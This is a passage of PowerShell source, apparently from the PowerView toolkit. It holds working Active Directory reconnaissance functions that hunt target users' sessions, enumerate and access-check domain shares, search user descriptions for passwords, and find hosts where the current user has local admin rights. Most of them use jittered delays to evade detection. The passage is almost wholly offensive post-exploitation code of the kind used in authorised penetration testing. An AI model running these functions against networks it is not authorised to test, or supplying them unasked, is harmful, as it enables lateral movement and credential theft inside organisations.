                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne "")){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            $serverOutput += "[+] Target user '$username' has a session on $server ($ip) from $cname"

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess.IsPresent){
                                Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                                if (Invoke-CheckLocalAdminAccess -Hostname $server){
                                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $server !"
                                }
                                if (Invoke-CheckLocalAdminAccess -Hostname $cname){
                                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }
            }
            # return/output this server's status array
            $serverOutput
        }
    }
}


function Invoke-ShareFinder {
    <#
    .SYNOPSIS
    Finds (non-standard) shares on machines in the domain.

    Author: @harmj0y
    
    .DESCRIPTION
    This function finds the local domain name for a host using Get-NetDomain,
    queries the domain for all active machines with Get-NetServers, then for 
    each server it gets a list of active shares with Get-NetShare. Non-standard
    shares can be filtered out with -ExcludeShares

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER ExcludeShares
    Exclude common shares from display (C$, IPC$, etc.)

    .PARAMETER CheckShareAccess
    Only display found shares that the local user has access to.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .EXAMPLE
    > Invoke-ShareFinder
    Find shares on the domain.
    
    .EXAMPLE
    > Invoke-ShareFinder -ExcludeShares
    Find non-standard shares on the domain.

    .EXAMPLE
    > Invoke-ShareFinder -Delay 60
    Find shares on the domain with a 60 second (+/- *.3) 
    randomized delay between touching each host.

    .EXAMPLE
    > Invoke-UserHunter -HostList hosts.txt
    Find shares for machines in the specified hostlist.

    .LINK
    harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [string]$HostList = "",
        [Parameter(Mandatory = $False)] [Switch] $ExcludeShares,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $CheckShareAccess,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3
    )

    # shares we want to ignore
    $excludedShares = @("", "ADMIN$", "IPC$", "C$", "PRINT$")

    # random object for delay
    $randNo = New-Object System.Random

    $domain = Get-NetDomain

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`n[*] Running ShareFinder on domain $domain with delay of $Delay"

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            $statusOutput += "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $statusOutput
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain for hosts...`r`n"
        $servers = Get-NetServers
    }

    # randomize the server list
    $servers = Get-ShuffledArray $servers

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        $statusOutput += "`r`n[!] No hosts found!"
        return $statusOutput
    }
    else{

        # return/output the current status lines
        $statusOutput

        foreach ($server in $servers){

            Write-Verbose "[*] Enumerating server $server"

            # start a new status output array for each server
            $serverOutput = @()

            if ($server -ne ""){
                # sleep for our semi-randomized interval
                Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                # optionally check if the server is up first
                $up = $true
                if($ping){
                    $up = Test-Server -Server $server
                }
                if($up){
                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Verbose "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = "\\"+$server+"\"+$netname

                        # make sure we get a real share name back
                        if (($netname) -and ($netname.trim() -ne "")){

                            # if the share is blank, or it's in the exclude list, skip it
                            if ($ExcludeShares.IsPresent){
                                if ($excludedShares -notcontains $netname){
                                    # see if we want to check access to this share
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}
                                    }
                                    else{
                                        $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                    }
                                }  
                            }
                            else{
                                if($CheckShareAccess){
                                    # check if the user has access to this path
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                    }
                                    catch {}

                                }
                                else{
                                    $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                }
                            }
                        }

                    }
                }

            }
            # return/output this server's status array
            $serverOutput
        }
    }
}


function Invoke-UserDescSearch {
    <#
    .SYNOPSIS
    Searches user descriptions for a given word, default password.

    .DESCRIPTION
    This function queries all users in the domain with Get-NetUsers,
    extracts all description fields and searches for a given
    term, default "password". Case is ignored.

    .PARAMETER Term
    Term to search for.

    .EXAMPLE
    > Invoke-UserDescSearch
    Find user accounts with "password" in the description.

    .EXAMPLE
    > Invoke-UserDescSearch -Term backup
    Find user accounts with "backup" in the description.
    #>

    [CmdletBinding()]
    param(
        [string]$Term = "password"
    )

    $users = Get-NetUsers
    foreach ($user in $users){
        $desc = $user.description
        if ( ($desc -ne $null) -and ($desc.ToLower().Contains($Term.ToLower())) ){
            $u = $user.SamAccountName
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.add('User', $u)
            $out.add('Description', $desc)
            $out
        }
    }

}


function Invoke-FindLocalAdminAccess {
    <#
    .SYNOPSIS
    Finds machines on the local domain where the current user has
    local administrator access.

    Idea stolen from the local_admin_search_enum post module in 
    Metasploit written by:
        'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
        'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
        'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

    Powershell module author: @harmj0y
    
    .DESCRIPTION
    This function finds the local domain name for a host using Get-NetDomain,
    queries the domain for all active machines with Get-NetServers, then for 
    each server it checks if the current user has local administrator
    access using Invoke-CheckLocalAdminAccess.

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.
    
    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .EXAMPLE
    > Invoke-FindLocalAdminAccess
    Find machines on the domain where the current user has local administrator
    access.

    .EXAMPLE
    > Invoke-FindLocalAdminAccess -Delay 60
    Find machines on the domain where the current user has local administrator
    access with a 60 second (+/- *.3) randomized delay between touching each host.

    .EXAMPLE
    > Invoke-UserHunter -HostList hosts.txt
    Find which machines in the host list the current user has local 
    administrator access.

    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
    #>

    [CmdletBinding()]
    param(
        [string]$HostList = "",
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3
    )

    $domain = Get-NetDomain

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`n[*] Running FindLocalAdminAccess on domain $domain with delay of $Delay"

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    # random object for delay
    $randNo = New-Object System.Random

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            $statusOutput += "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $statusOutput
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain for hosts...`r`n"
        $servers = Get-NetServers
    }

    # randomize the server list
    $servers = Get-ShuffledArray $servers

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        $statusOutput += "`r`n[!] No hosts found!"
        return $statusOutput
    }
    else{

        $statusOutput += "[*] Checking hosts for local admin access...`r`n"
        $statusOutput

        foreach ($server in $servers){

            Write-Verbose "[*] Enumerating server $server"

            # start a new status output array for each server
            $serverOutput = @()

            # sleep for our semi-randomized interval
            Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            $up = $true
            if($ping){
                $up = Test-Server -Server $server
            }
            if($up){
                # check if the current user has local admin access to this server
                $access = Invoke-CheckLocalAdminAccess -HostName $server
                if ($access) {
                    $ip = Get-HostIP -hostname $server
                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
                }
            }
            # return/output this server's status array
            $serverOutput
        }
    }
}
